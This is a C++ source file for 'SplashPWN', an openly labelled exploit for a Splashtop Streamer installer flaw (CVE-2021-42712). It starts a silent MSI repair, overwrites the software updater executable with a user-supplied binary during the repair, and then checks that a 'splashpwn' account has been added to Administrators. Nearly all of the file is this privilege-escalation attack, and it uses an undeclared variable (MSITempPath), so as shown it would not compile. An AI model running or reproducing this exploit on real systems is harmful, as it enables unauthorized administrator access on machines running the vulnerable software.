#include <windows.h>
#include <msi.h>
#include <lm.h>
#include <iostream>
#include <tchar.h>
#include <assert.h>
#pragma comment(lib, "msi.lib")
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "Advapi32.lib")

// To compile open vs cmd prompt and run: 
// cl /EHsc SplashPWN.cpp

void printart(){
	std::cout << R"(
       _____       __           __    ____ _       ___   __
      / ___/____  / /___ ______/ /_  / __ \ |     / / | / /
      \__ \/ __ \/ / __ `/ ___/ __ \/ /_/ / | /| / /  |/ / 
     ___/ / /_/ / / /_/ (__  ) / / / ____/| |/ |/ / /|  /  
    /____/ .___/_/\__,_/____/_/ /_/_/     |__/|__/_/ |_/   
        /_/                                                

    Exploit for: CVE-2021-42712 discovered by Ronnie Salomonsen
    Written by: Spencer Alessi @techspence
)" ;	
}

void printusage() {
    std::cout << "\n\tUsage: SplashPWN.exe path_to_msi path_to_your_exe" << std::endl;
    std::cout << "\n\tOptions:" << std::endl;
    std::cout << "\t- path_to_msi: The path to the vulnerable Splashtop Streamer msi in c:\\windows\\installer" << std::endl;
    std::cout << "\t- path_to_your_exe: The path to your own totally legit exe" << std::endl;
}

struct ThreadData {
    std::string dMSITempPath;
    std::string dProductCodeGuid;
    std::string dOurEXEPath;
    std::string dSSUPath;
};

DWORD WINAPI ReinstallMSI(LPVOID lpParameter) {
    ThreadData* data = (ThreadData*)lpParameter;

    // The product code of the MSI to repair
    LPCSTR szProduct = data->dProductCodeGuid.c_str();

    // How much of the product should be installed when installing the product to its default state
    int iInstallLevel = INSTALLLEVEL_DEFAULT;

    // The repair state (use INSTALLSTATE_DEFAULT to repair all features)
    INSTALLSTATE eInstallState = INSTALLSTATE_DEFAULT;

    // Secify the level of complexity of the user interface: Completely silent installation
    INSTALLUILEVEL dwUILevel = INSTALLUILEVEL_NONE;

    // The return value of the interface function
    UINT uiInterfaceResult;

    // Configure the installer's internal user interface
    uiInterfaceResult = MsiSetInternalUI(dwUILevel, NULL);

    // The return value of the function
    UINT uiResult;

    // Initiate the repair
    uiResult = MsiConfigureProductExA(szProduct, iInstallLevel, eInstallState, NULL);

    if (uiResult != ERROR_SUCCESS) {
        // The repair failed
        std::cerr << "OOPSIE! Something went wrong." << std::endl;
    }

    return 0;
}

std::string GetSplashtopProductID()
{
    HKEY hKey;
    DWORD dwType = REG_SZ;
    DWORD dwSize = MAX_PATH;
    std::string value;
    value.resize(dwSize);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Splashtop Inc.\\Splashtop Remote Server", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
    {
        return "";
    }

    if (RegGetValue(hKey, NULL, "PRODUCTID", RRF_RT_REG_SZ, &dwType, &value[0], &dwSize) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return "";
    }

    value.resize(dwSize - 1);
    RegCloseKey(hKey);
    return value;
}

BOOL UserExists(LPCSTR lpUsername) {
    DWORD dwSize = 0;
    SID_NAME_USE snu;
    TCHAR lpDomainName[256];
    DWORD dwDomainNameSize = sizeof(lpDomainName);

    if (LookupAccountName(NULL, _T(lpUsername), NULL, &dwSize, lpDomainName, &dwDomainNameSize, &snu)) {
        // user found
        return true;
    }
    else {
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            PSID pSid = (PSID) new BYTE[dwSize];
            if (LookupAccountName(NULL, _T(lpUsername), pSid, &dwSize, lpDomainName, &dwDomainNameSize, &snu)) {
                // user not found
                return true;
            }
            else {
                // user not found
                return false;
            }
            delete[] pSid;
        }
        else {
            // user not found
            return false;
        }
    }
}

BOOL IsUserAdmin(LPCWSTR userName)
{
    LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;
    DWORD dwLevel = 0;
    DWORD dwFlags = LG_INCLUDE_INDIRECT;
    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    NET_API_STATUS nStatus;
    BOOL isUserAdmin = FALSE;


    // Call the NetUserGetLocalGroups function 
    //  specifying information level 0.
    //
    //  The LG_INCLUDE_INDIRECT flag specifies that the 
    //   function should also return the names of the local 
    //   groups in which the user is indirectly a member.
    nStatus = NetUserGetLocalGroups(NULL, userName, dwLevel, dwFlags, (LPBYTE*)&pBuf, dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries);

    if (nStatus == NERR_Success)
    {
        LPLOCALGROUP_USERS_INFO_0 pTmpBuf;
        DWORD i;
        DWORD dwTotalCount = 0;

        if ((pTmpBuf = pBuf) != NULL)
        {

            // Loop through the entries and 
            //  print the names of the local groups 
            //  to which the user belongs. 
            for (i = 0; i < dwEntriesRead; i++)
            {
                assert(pTmpBuf != NULL);

                if (pTmpBuf == NULL)
                {
                    fprintf(stderr, "An access violation has occurred\n");
                    break;
                }

                if (wcscmp(pTmpBuf->lgrui0_name, L"Administrators") == 0) {
                    isUserAdmin = TRUE;
                    return isUserAdmin;
                }


                pTmpBuf++;
                dwTotalCount++;
            }
        }
    }
    else
        fprintf(stderr, "A system error has occurred: %d\n", nStatus);

    // Free the allocated memory.
    if (pBuf != NULL)
    {
        NetApiBufferFree(pBuf);

    }

    return isUserAdmin;


}

int main(int argc, char* argv[])
{
    printart();

    if (argc > 1 && argc < 3)
    {
        std::cerr << "\nError: not enough arguments provided. Please provide the path to the splashtop MSI and the path to your own totally legit exe" << std::endl;
        printusage();
        return 1;
    } else if (argc > 3)
    {
        std::cerr << "\nError: too many arguments provided. Please provide the path to the splashtop MSI and the path to your own totally legit exe" << std::endl;
        printusage();
        return 1;
    }
    else if (argc == 1) {
        printusage();
        return 1;
    }
    
    std::string MSIPath = argv[1];
    std::string OurEXEPath = argv[2];
    std::string SplashtopProductID = GetSplashtopProductID();
    std::string localAppData = std::getenv("LOCALAPPDATA");
    std::string SplashtopTempFolder = localAppData + "\\temp\\" + SplashtopProductID;
    std::string SSUPath = SplashtopTempFolder + "\\" + "Splashtop_Software_Updater.exe";
    
    // Get MSI file name and extension
    char FileName[_MAX_FNAME];
    char ext[_MAX_EXT];   
    _splitpath(MSIPath.c_str(), NULL, NULL, FileName, ext);

    std::cout << "[i] Starting a repair with MsiConfigureProductExA" << std::endl;
    std::cout << "[i] Overwriting Splashtop_Software_Updater.exe with our own exe" << std::endl;
    std::cout << "[i] Sleeping to let the installer finish" << std::endl;

    ThreadData data;
    data.dMSITempPath = MSITempPath;
    data.dProductCodeGuid = SplashtopProductID;
    HANDLE hThread = CreateThread(NULL, 0, ReinstallMSI, &data, 0, NULL);
    if (hThread == NULL) {
        std::cout << "Failed to create thread." << std::endl;
        return 1;
    }
    
    CloseHandle(hThread);
    
    Sleep(2000);

    if (CopyFileA(OurEXEPath.c_str(), SSUPath.c_str(), FALSE)) {
        // file copied successfully
    }
    else {
        std::cout << "[ERROR] File copy failed." << std::endl;
    }

    Sleep(20000);

    LPCWSTR wuserName = L"splashpwn";
    LPCSTR cuserName = "splashpwn";
    
    BOOL bUser = UserExists(cuserName);
    if (bUser) {
        std::cout << "[i] User splashpwn created successfully" << std::endl;
    }
    else {
        std::cout << "[ERROR] User was not created" << std::endl;
    }

    BOOL bAdmin = IsUserAdmin(wuserName);
    if (bAdmin) {
        std::cout << "[i] User splashpwn added to Administrators successfully" << std::endl;
    }
    else {
        std::cout << "[ERROR] User splashpwn was not added to Administrators" << std::endl;
    }
   
    std::cout << "[+] SplashPWN is finished. May the odds be ever in your favor" << std::endl;
    

    return 0;
}